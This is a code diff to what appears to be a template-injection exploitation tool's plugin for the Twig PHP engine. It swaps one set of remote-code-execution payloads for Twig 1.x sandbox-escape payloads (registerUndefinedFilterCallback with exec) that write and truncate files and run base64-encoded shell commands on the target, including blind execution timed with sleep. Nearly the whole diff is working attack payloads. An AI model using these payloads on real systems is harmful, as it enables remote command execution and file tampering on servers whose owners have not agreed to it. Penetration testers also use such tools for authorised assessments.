@@ -3,7 +3,7 @@ from plugins.languages import bash
 from utils import rand
 
 
-class Twig(php.Php):
+class Twig_v1(php.Php):
     def init(self):
         # The vulnerable versions <1.20.0 allows to map the getFilter() function
         # to any PHP function, allowing the sandbox escape.
@@ -12,18 +12,18 @@ class Twig(php.Php):
         self.update_actions({
             'render': {
                 'render': '{code}',
-                # Disable errors, so that "system" will not corrupt the output with a warning
-                'header': '{{% for a in ["error_reporting", "0"]|sort("ini_set") %}}{{% endfor %}}{{{{{header}}}}}',
+                'header': '{{{{{header}}}}}',
                 'trailer': '{{{{{trailer}}}}}',
                 # {{7*'7'}} and a{#b#}c work in freemarker as well
                 # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
-                'test_render': f'{{{{(1..3)|sort((x, y) => x < y)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
-                'test_render_expected': f'321{rand.randstrings[0]}<br />'
+                # "sameas" worked in 1.x but was replaced by "same as" in 2.x
+                'test_render': f'{{% if 1 is sameas(1) %}}{{{{(1..3)|join("")}}}}{{% endif %}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
+                'test_render_expected': f'123{rand.randstrings[0]}<br />'
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}'", ""]|sort("system") }}}}""",
-                'truncate': """{{{{ ["echo -n >{path}", ""]|sort("system") }}}}"""
+                'write': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}'")}}}}""",
+                'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
             },
             # Hackish way to evaluate PHP code
             'evaluate': {
@@ -34,13 +34,13 @@ class Twig(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{% set foo=[] %}}{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
+                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'")}}}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
+                'execute_blind': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}'")}}}}"""
             },
             'evaluate_blind': {
                 'call': 'execute',
@@ -53,7 +53,6 @@ class Twig(php.Php):
             {'level': 0},
             {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
             {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
-            {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
             {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': php.ctx_closures},
             # This escapes string "inter#{"asd"}polation"
             {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
